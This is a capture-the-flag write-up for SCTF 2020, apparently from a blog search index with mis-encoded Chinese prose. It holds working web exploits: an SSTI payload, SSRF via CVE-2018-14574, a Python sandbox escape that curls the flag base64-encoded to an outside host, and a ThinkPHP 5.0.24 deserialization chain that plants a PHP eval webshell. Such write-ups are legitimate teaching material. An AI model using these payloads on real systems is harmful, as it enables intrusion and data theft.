<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sctf2020</title>
      <link href="/2020/07/07/sctf2020/"/>
      <url>/2020/07/07/sctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>é˜…è¯»ä»£ç å‘ç°ï¼Œè¿™ä¸€é¢˜å­˜åœ¨ç€ä¸¤ä¸ªç¯å¢ƒï¼Œå…¶ä¸­ï¼Œå†…ç½‘æœåŠ¡å¯ä»¥sstiï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®¿é—®å†…ç½‘ï¼š</p><pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])def caculator():    try:        data = request.get_json()    except ValueError:        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})    num1 = str(data[&quot;num1&quot;])    num2 = str(data[&quot;num2&quot;])    symbols = data[&quot;symbols&quot;]    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre><p>å¯ä»¥è¿›è¡Œç¬¦åˆæ¡ä»¶çš„ssrfçš„åªæœ‰</p><pre><code class="python">def flask_rpc(request):    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})    methods = request.GET.get(&quot;methods&quot;)    url = request.GET.get(&quot;url&quot;)    if methods == &quot;GET&quot;:        return JsonResponse(            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})    elif methods == &quot;POST&quot;:        data = base64.b64decode(request.GET.get(&quot;data&quot;))        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})    else:        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})</code></pre><p>ä½†æ˜¯éœ€è¦<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>ï¼Œåˆ©ç”¨ CVE-2018-14574è·³è½¬åˆ°127.0.0.1:8000è®¿é—®/rpc ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½sstiï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦æåˆ°Token</p><pre><code class="python">@login_requireddef home(request):    if request.method == &quot;GET&quot;:        return render(request, &quot;templates/home.html&quot;)    elif request.method == &quot;POST&quot;:        white_list = [&quot;39.104.19.182&quot;]        try:            data = json.loads(request.body)        except ValueError:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})        if Token.objects.all().first().Token == data[&quot;token&quot;]:            try:                if ssrf_check(data[&quot;url&quot;], white_list):                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})                else:                    res = requests.get(data[&quot;url&quot;], timeout=1)            except Exception:                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})            if res.status_code == 200:                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})            else:                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})        else:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})</code></pre><pre><code class="python">def reg(request):    if request.method == &quot;GET&quot;:        return render(request, &quot;templates/reg.html&quot;)    elif request.method == &quot;POST&quot;:        try:            data = json.loads(request.body)        except ValueError:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:            return JsonResponse({&quot;code&quot;: 1})        User.objects.create_user(**data)        return JsonResponse({&quot;code&quot;: 0})</code></pre><p>æ„é€ ï¼š<code>{&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true}</code></p><p>å¾—åˆ°token:<code>3ad9af405504233188f694a11ff22115</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯sstiäº†</p><pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])def caculator():    try:        data = request.get_json()    except ValueError:        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})    num1 = str(data[&quot;num1&quot;])    num2 = str(data[&quot;num2&quot;])    symbols = data[&quot;symbols&quot;]    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre><p>æœ€åçš„payload:</p><pre><code class="python">import requestsimport base64import jsonnum1=1num2=2symbols=&quot;-{{''.__class__.__mro__[1].__subclasses__()[409]('/readflag',shell=True,stdout=-1).communicate()}}-&quot;data={    &quot;num1&quot;:num1,    &quot;num2&quot;:num2,    &quot;symbols&quot;:symbols}payload=json.dumps(data).replace(&quot;{{","\\u007b\\u007b").replace("}}&quot;,&quot;\\u007d\\u007d&quot;)payload=base64.b64encode(payload)print(payload)burp0_url = &quot;http://39.104.19.182:80/home/&quot;burp0_cookies = {&quot;sessionid&quot;: &quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;, &quot;csrftoken&quot;: &quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://39.104.19.182&quot;, &quot;Referer&quot;: &quot;http://39.104.19.182/home/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_json={&quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;, &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data={payload}&quot;.format(payload=payload)}print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</code></pre><p><code>SCTF{2b19246757c63738e7c40bbdf87c3be1}</code></p><h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answerğŸ˜€.</p><p>æœç´¢ â€œç©ºé—´ç«™â€ â€œæ¥æ”¶æœºâ€ ä¿¡æ¯ éŸ³é¢‘ ç­‰å…³é”®å­—æ‰¾åˆ°<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTVå…³é”®å­—</p><p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p><p>ä¸‹è½½ mmsstv<br>ä¿®æ”¹å½•éŸ³è®¾å¤‡ä¸ºç«‹ä½“å£°æ··éŸ³<br>å…·ä½“æ“ä½œä¸ºï¼šOption-&gt;Soundcard input level<br>æ’­æ”¾éŸ³é¢‘å¾—åˆ°flag:</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p><h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p><pre><code class="javascript=">HTTP/1.1 200 OKContent-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;Content-Length: 1547Last-Modified: Sat, 04 Jul 2020 05:14:45 GMTCache-Control: max-age=0Content-Type: application/octet-streamDate: Sat, 04 Jul 2020 05:14:50 GMTConnection: closeconst fs = require(&#39;fs&#39;);const path = require(&#39;path&#39;);const crypto = require(&#39;crypto&#39;);const Koa = require(&#39;koa&#39;);const Router = require(&#39;koa-router&#39;);const koaBody = require(&#39;koa-body&#39;);const send = require(&#39;koa-send&#39;);const app = new Koa();const router = new Router();const SECRET = &quot;03229a6694e657077f218c322f3e0bea&quot;app.use(koaBody({  multipart: true,  formidable: {      maxFileSize: 2000 * 1024 * 1024   }}));router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {  const file = ctx.request.body.files.file;  if (!fs.existsSync(file.path)) {    return ctx.body = &quot;Error&quot;;  }  if(file.path.toString().search(&quot;/fd/&quot;) != -1){    file.path=&quot;/dev/null&quot;  }  const reader = fs.createReadStream(file.path);  let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);  let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId  const upStream = fs.createWriteStream(filePath);  reader.pipe(upStream)  return ctx.body = &quot;Upload success ~, your fileId is hereÃ¯Â¼Âš&quot; + fileId;});router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {  let fileId = ctx.params.fileId;  ctx.attachment(fileId);  try {    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });  }catch(e){    return ctx.body = &quot;SCTF{no_such_file_~}&quot;  }});router.get(&#39;/&#39;, async (ctx, next) =&gt; {  ctx.response.type = &#39;html&#39;;  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);});app.use(router.routes());app.listen(3333, () =&gt; {  console.log(&#39;This server is running at http://localhost:&#39; + 3333)})</code></pre><p>å› ä¸ºkoaä¸­è®¿é—®å‚æ•°ä¹Ÿæ˜¯ctx.request.body.xxxx æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p><pre><code>POST /uploadfile HTTP/1.1Host: 127.0.0.1:3333Content-Length: 77User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Content-Type: application/jsonAccept: */*Origin: http://127.0.0.1:3333Referer: http://127.0.0.1:3333/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;flag&quot;}}}</code></pre><p>æ¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p><h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><pre><code class="php=">Route::get(&#39;/&#39;,&quot;IndexController@init&quot;);Route::post(&#39;/rm&#39;,&quot;IndexController@rm&quot;);Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {    readfile(&quot;./var/tmp/&quot;.$filename);})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);Route::post(&#39;/upload&#39;,&quot;IndexController@upload&quot;);Route::get(&#39;/move/log/{filename}&#39;, &#39;IndexController@moveLog&#39;)-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre><pre><code class="php=">&lt;?phpnamespace App\Http\Controllers;class IndexController extends Controller{    public function init(){        if($_SERVER[&quot;REMOTE_ADDR&quot;] !== &quot;127.0.0.1&quot; &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;192.168.&quot;) !== 0 &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;10.&quot;) !== 0 )  {            die(&quot;admin only&quot;);        }        if(!file_exists(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]))){            mkdir(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]));        }    }    public function rm(){        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);        if(file_exists(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){            if(is_dir(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){                rmdir(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);                echo &quot;rmdir&quot;;            }            else{                unlink(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);                echo &quot;unlink&quot;;            }        }    }    public function upload()    {        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);        file_put_contents(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;],base64_decode($_POST[&quot;content&quot;]));        echo &quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;];    }    public function moveLog($filename)    {        $data =date(&quot;Y-m-d&quot;);        if(!file_exists(storage_path(&quot;logs&quot;).&quot;/&quot;.$data)){            mkdir(storage_path(&quot;logs&quot;).&quot;/&quot;.$data);        }        $opts = array(            &#39;http&#39;=&gt;array(                &#39;method&#39;=&gt;&quot;GET&quot;,                &#39;timeout&#39;=&gt;1,//å•ä½ç§’            )        );        $content = file_get_contents(&quot;http://127.0.0.1/tmp/&quot;.md5(&#39;127.0.0.1&#39;).&quot;/&quot;.$filename,false,stream_context_create($opts));        file_put_contents(storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename,$content);        echo storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename;    }}</code></pre><p>storage_path(â€œlogsâ€):/var/www/html/storage/logs</p><p>upload dir : /var/tmp/md5(IP)/</p><pre><code class="php=">Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {    readfile(&quot;./var/tmp/&quot;.$filename);})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre><p>ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å› ä¸ºä¸¤ä¸ª../æœåŠ¡å™¨ä¸ä¼šè§£æç›´æ¥æŠ¥é”™çš„åŸå› æ— æ³•ç©¿åˆ°æ ¹ç›®å½•ï¼Œåæ¥æƒ³åˆ°åœ¨å¼„ä¸ªindex.phpå°±å¥½äº†<br>æœ€åçš„payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p><p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p><h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p><pre><code class="python=">from flask import Flask, requestapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])def security():    secret = request.form[&quot;cmd&quot;]    for i in secret:        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;    exec(secret)    return &quot;xXXxXXx&quot;if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;)</code></pre><p>æµ‹è¯•ç¯å¢ƒï¼š<a href="http://ccreater.top:60011/" target="_blank" rel="noopener">http://ccreater.top:60011/</a><br>ç¦ç”¨å­—ç¬¦ï¼š</p><p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p><p>åˆ©ç”¨é­”æœ¯æ–¹æ³•? : <code>__getitem__,__getattr__</code></p><p>payload:</p><pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#39;) HTTP/1.1Host: 39.104.90.30:10006Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8Referer: http://39.104.90.30:10006/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5bContent-Length: 248------WebKitFormBoundaryx3B8HB5bContent-Disposition: form-data; name=&quot;cmd&quot;request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p><pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1Host: 39.104.90.30:10006Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8Referer: http://39.104.90.30:10006/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5bContent-Length: 248------WebKitFormBoundaryx3B8HB5bContent-Disposition: form-data; name=&quot;cmd&quot;request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="ä¸ºä½•payloadèƒ½è¿è¡Œ"><a href="#ä¸ºä½•payloadèƒ½è¿è¡Œ" class="headerlink" title="ä¸ºä½•payloadèƒ½è¿è¡Œ"></a>ä¸ºä½•payloadèƒ½è¿è¡Œ</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“python è°ƒç”¨ç±»æ–¹æ³•çš„æ—¶å€™ä¼šä¼ å…¥<code>self</code>å‚æ•°ï¼Œè€Œæˆ‘ä»¬è°ƒç”¨<code>app.config==request.args.a</code>åº”è¯¥ä¹Ÿä¼šä¼ å…¥selfå‚æ•°ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æˆåŠŸ</p><p>æµ‹è¯•ä»£ç </p><pre><code class="python">class A():    passa = A()a.__class__.__eq__=evala==&quot;print(123)&quot;</code></pre><p>æˆ‘ä»¬è·Ÿè¿›pythonåº•å±‚çœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p><p>è¿™é‡Œæ˜¾ç¤ºnargsæ˜¾ç¤ºåªæœ‰1ä¸ªå‚æ•°ï¼Œå‚çœ‹å †æ ˆï¼Œè·Ÿè¸ªåˆ°æœ€å¼€å§‹çš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p><p>è¿™é‡Œæˆ‘ä»¬ç¡®å®ä¼ å…¥äº†self,å…¶ä¸­væ˜¯<code>self</code>,wæ˜¯<code>print(123)</code></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p><p>åœ¨<code>call_unbound</code>å¤„æˆ‘ä»¬å‘ç°äº†åŸå› ï¼Œæ˜¯å› ä¸ºubound==0</p><p>åœ¨<code>lookup_maybe_method</code>ä¸­è®¾ç½®äº†uboundçš„å€¼</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p><p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p><blockquote><p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p></blockquote><h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p><pre><code>http://39.99.41.124/public/log.txthttp://39.99.41.124/public/test/http://39.99.41.124/public/nationalsb/login.php</code></pre><p>åœ¨<a href="http://39.99.41.124/public/nationalsb/js/script.jsä¸­å‘ç°è´¦å·å¯†ç ï¼š" target="_blank" rel="noopener">http://39.99.41.124/public/nationalsb/js/script.jsä¸­å‘ç°è´¦å·å¯†ç ï¼š</a></p><pre><code>    //username:Admin1964752    //password:DsaPPPP!@#amspe1221    //Secret **** is your birthday</code></pre><p>æ–‡ä»¶åŒ…å«:</p><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 39.99.41.124Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 16file=/etc/passwd</code></pre><pre><code>Warning&lt;/b&gt;:  include(): Failed opening &#39;php://filter/read=convert.base64-encode/resource=index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</code></pre><pre><code>GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Host: 39.99.41.124Connection: close</code></pre><pre><code class="php=">&lt;?phpnamespace app\index\controller;class Index extends \think\Controller{  public function index(){      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;    }  public function hello(){      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));  }}</code></pre><p>/var/www/html/protect.py</p><pre><code class="python=">....</code></pre><pre><code class="php=">&lt;?phpnamespace think\cache\driver;class File {    protected $options = [];    protected $tag;    public function __construct() {    $this-&gt;tag = &#39;cjbtest&#39;;    $this-&gt;options = [        &#39;cache_subdir&#39;  =&gt; false,        &#39;prefix&#39;        =&gt; &#39;&#39;,        &#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#39;, // å› ä¸º static ç›®å½•æœ‰å†™æƒé™        &#39;data_compress&#39; =&gt; false    ];    }}namespace think\session\driver;use think\cache\driver\File;class Memcached {    protected $handler;    function __construct() {    $this-&gt;handler=new File();    }}namespace think\console;use think\session\driver\Memcached;class Output {    protected $styles = [];    private $handle;    function __construct() {    $this-&gt;styles = [&quot;getAttr&quot;, &#39;info&#39;,             &#39;error&#39;,             &#39;comment&#39;,             &#39;question&#39;,             &#39;highlight&#39;,             &#39;warning&#39;];    $this-&gt;handle = new Memcached();    }}namespace think\db;use think\console\Output;class Query {    protected $model;    function __construct() {    $this-&gt;model = new Output();    }}namespace think\model\relation;use think\console\Output;use think\db\Query;class HasOne {    public $model;    protected $selfRelation;    protected $parent;    protected $query;    protected $bindAttr = [];    public function __construct() {    $this-&gt;query = new Query(&quot;xx&quot;, &#39;think\console\Output&#39;);    $this-&gt;model = false;    $this-&gt;selfRelation = false;    $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];    }}namespace think\model;use think\console\Output;use think\model\relation\HasOne;abstract class Model {}class Pivot extends Model {    public $parent;    protected $append = [];    protected $data = [];    protected $error;    protected $model;    function __construct() {    $this-&gt;parent = new Output();    $this-&gt;error = new HasOne();    $this-&gt;model = &quot;test&quot;;    $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];    $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];    }}namespace think\process\pipes;use think\model\Pivot;class Windows {    private $files = [];    public function __construct() {    $this-&gt;files=[new Pivot()];    }}$obj = new Windows();$payload = serialize($obj);echo base64_encode($payload);</code></pre><p>å†™æ–‡ä»¶åˆ°/tmp</p><pre><code class="python=">import requestsimport hashlibpayload=requests.get(&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;).text.strip()burp0_url = &quot;http://8.208.102.48:80/public/index.php&quot;params={    &quot;s&quot;:&quot;/index/Index/hello&quot;,    &quot;s3cr3tk3y&quot;:payload}burp0_headers = {&quot;Authorization&quot;: &quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;, &quot;Connection&quot;: &quot;close&quot;}res=requests.get(burp0_url, headers=burp0_headers ,params=params)print(res.text)print(requests.get(&quot;http://8.208.102.48:80/public/log.txt&quot;).text)</code></pre><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 8.208.102.48Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 155file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</code></pre><p>å†™åˆ°æ–‡ä»¶é‡Œçš„å†…å®¹</p><pre><code>&lt;?php//000000000000 exit();?&gt;s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</code></pre><p>è¿™é‡Œ <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> é‡Œé¢çš„æ–¹æ³•å·²ç»ä¸ç®¡ç”¨äº†ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æƒ³å‡ºå…¶ä»–åŠæ³•</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>æ¥ç»•è¿‡æ­»äº¡exit</p><pre><code class="php">    $backdoor = &#39;&lt;?php 